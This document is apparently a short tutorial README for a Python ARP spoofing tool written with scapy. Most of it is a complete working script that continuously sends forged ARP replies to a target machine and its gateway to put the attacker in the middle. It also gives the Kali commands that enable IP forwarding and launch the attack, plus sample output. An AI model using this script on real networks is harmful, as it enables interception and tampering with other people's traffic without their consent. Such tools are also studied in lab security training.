# ARP SPOOFING

# Usage:
- ARP use for clients to link each other in the same network
- ARP is not secure
# Technology:
- Dynamic printing

# Execution:

```python
# arp_spoof.py
#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # use custom Ether to capture MAC of the broadcast
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    # srp return 2 list answered and unanswered list
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip_sp, spoof_ip):
    target_mac = get_mac(target_ip_sp)
    # pdst: IP address of the victim, hwdst: MAC address of the victim, psrc: IP address of the
    packet = scapy.ARP(op=2, pdst=target_ip_sp, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip,
                       hwdst=get_mac(destination_ip), hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)


target_ip = '192.168.17.137'
gateway_ip = '192.168.17.2'

# print(get_mac(target_ip))
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Package sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected CTRL + C .... Resetting ARP table... Please wait!')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


```
- run this to forward the packet so the man in the middle will add as **router**
```bash
root@kali:~/PycharmProjects/arp-spoof# echo 1 > /proc/sys/net/ipv4/ip_forward

```
- run this to start the attack the network
- please navigate inside the source code folder whenever you store 
```bash
root@kali:~/PycharmProjects/arp-spoof# python3 arp_spoof.py
```
- If sucess, this is the output
```bash
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.

```
